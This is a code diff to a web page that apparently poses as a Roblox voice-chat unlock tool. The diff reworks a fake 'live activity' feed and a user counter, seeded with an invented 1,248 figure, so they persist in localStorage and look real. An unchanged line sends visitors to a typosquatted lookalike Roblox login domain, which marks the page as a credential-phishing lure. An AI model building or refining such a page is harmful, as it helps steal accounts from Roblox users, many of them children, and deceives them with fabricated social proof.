@@ -763,7 +763,7 @@
           <span>Live Activity</span>
         </div>
         <div class="live-stat">
-          <div class="live-stat-number" id="todayCount">1,248</div>
+          <div class="live-stat-number" id="todayCount">0</div>
           <div class="live-stat-label">users unlocked VC today</div>
         </div>
         <div class="live-stat">
@@ -777,18 +777,8 @@
         <div class="activity-feed" id="activityFeed">
           <div class="activity-item">
             <i class="fas fa-check-circle"></i>
-            <span><span class="activity-user">@xX_ProGamer_Xx</span> just unlocked VC</span>
+            <span><span class="activity-user">@System</span> Live stats started</span>
             <span class="activity-time">just now</span>
-          </div>
-          <div class="activity-item">
-            <i class="fas fa-check-circle"></i>
-            <span><span class="activity-user">@BloxyMaster</span> just unlocked VC</span>
-            <span class="activity-time">2 min ago</span>
-          </div>
-          <div class="activity-item">
-            <i class="fas fa-check-circle"></i>
-            <span><span class="activity-user">@RobloxFan2024</span> just unlocked VC</span>
-            <span class="activity-time">5 min ago</span>
           </div>
         </div>
       </div>
@@ -873,9 +863,26 @@
   // Redirect URL
   const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
   
-  // REAL STATS - These update only when someone actually processes
-  let todayCount = 1248;  // Starting count
-  let processingQueue = []; // Active processing users
+  // ========== PERSISTENT STORAGE ==========
+  // Load saved data from localStorage, or initialize if not exists
+  let todayCount = parseInt(localStorage.getItem('vc_today_count')) || 1248;
+  let activityHistory = JSON.parse(localStorage.getItem('vc_activity_history')) || [];
+  
+  // Save functions
+  function saveTodayCount() {
+    localStorage.setItem('vc_today_count', todayCount);
+  }
+  
+  function saveActivityHistory() {
+    // Keep only last 20 activities
+    if (activityHistory.length > 20) {
+      activityHistory = activityHistory.slice(0, 20);
+    }
+    localStorage.setItem('vc_activity_history', JSON.stringify(activityHistory));
+  }
+  
+  // Processing queue (real-time, not saved)
+  let processingQueue = [];
   
   const statusDiv = document.getElementById('statusArea');
   const progressContainer = document.getElementById('progressContainer');
@@ -909,39 +916,52 @@
     }, 7500);
   }
   
-  // Add real activity to feed (only when someone actually confirms)
-  function addRealActivity(username) {
-    const activityItem = document.createElement('div');
-    activityItem.className = 'activity-item';
-    const now = new Date();
-    const timeString = 'just now';
-    activityItem.innerHTML = `
-      <i class="fas fa-check-circle"></i>
-      <span><span class="activity-user">@${username}</span> just unlocked VC</span>
-      <span class="activity-time">just now</span>
-    `;
-    activityFeed.insertBefore(activityItem, activityFeed.firstChild);
-    
-    // Remove oldest item if more than 10
-    while (activityFeed.children.length > 10) {
-      activityFeed.removeChild(activityFeed.lastChild);
+  // Format time ago
+  function getTimeAgo(timestamp) {
+    const seconds = Math.floor((Date.now() - timestamp) / 1000);
+    if (seconds < 60) return 'just now';
+    const minutes = Math.floor(seconds / 60);
+    if (minutes < 60) return `${minutes} min ago`;
+    const hours = Math.floor(minutes / 60);
+    if (hours < 24) return `${hours} hr ago`;
+    return `${Math.floor(hours / 24)} days ago`;
+  }
+  
+  // Render activity feed from history
+  function renderActivityFeed() {
+    activityFeed.innerHTML = '';
+    if (activityHistory.length === 0) {
+      activityFeed.innerHTML = '<div class="activity-item"><i class="fas fa-info-circle"></i><span>No recent activity</span><span class="activity-time"></span></div>';
+      return;
     }
     
-    // Update timestamps of existing items
-    const items = activityFeed.querySelectorAll('.activity-item');
-    items.forEach((item, index) => {
-      const timeSpan = item.querySelector('.activity-time');
-      if (index === 0) {
-        timeSpan.textContent = 'just now';
-      } else {
-        const minutes = index * 2 + 1;
-        if (minutes < 60) {
-          timeSpan.textContent = `${minutes} min ago`;
-        } else {
-          timeSpan.textContent = `${Math.floor(minutes / 60)} hr ago`;
-        }
-      }
+    activityHistory.forEach((activity) => {
+      const activityItem = document.createElement('div');
+      activityItem.className = 'activity-item';
+      activityItem.innerHTML = `
+        <i class="fas fa-check-circle"></i>
+        <span><span class="activity-user">@${activity.username}</span> just unlocked VC</span>
+        <span class="activity-time">${getTimeAgo(activity.timestamp)}</span>
+      `;
+      activityFeed.appendChild(activityItem);
     });
+  }
+  
+  // Add real activity to history (only when someone actually confirms)
+  function addRealActivity(username) {
+    // Add to beginning of array (most recent first)
+    activityHistory.unshift({
+      username: username,
+      timestamp: Date.now()
+    });
+    
+    // Keep only last 20
+    if (activityHistory.length > 20) {
+      activityHistory = activityHistory.slice(0, 20);
+    }
+    
+    saveActivityHistory();
+    renderActivityFeed();
   }
   
   function setStatus(message, type = 'info') {
@@ -1095,6 +1115,7 @@
       // REAL STATS - Only increment when user actually processes
       todayCount++;
       todayCountElem.textContent = todayCount.toLocaleString();
+      saveTodayCount(); // Save to localStorage immediately
       
       // Add to activity feed (REAL ACTIVITY)
       addRealActivity(username);
@@ -1137,23 +1158,14 @@
     }
   });
   
-  // Update timestamps every minute
+  // Update timestamps every minute (for display only, doesn't affect saved data)
   setInterval(() => {
-    const items = activityFeed.querySelectorAll('.activity-item');
-    items.forEach((item, index) => {
-      const timeSpan = item.querySelector('.activity-time');
-      if (index === 0 && timeSpan.textContent === 'just now') {
-        // Keep first as just now
-      } else {
-        const minutes = index * 2 + 1;
-        if (minutes < 60) {
-          timeSpan.textContent = `${minutes} min ago`;
-        } else {
-          timeSpan.textContent = `${Math.floor(minutes / 60)} hr ago`;
-        }
-      }
-    });
+    renderActivityFeed();
   }, 60000);
+  
+  // Initialize display with saved data
+  todayCountElem.textContent = todayCount.toLocaleString();
+  renderActivityFeed();
   
   setTimeout(() => {
     setStatus("Click 'Get Profile Link' to get your profile link, then paste it and enter your username", "info");
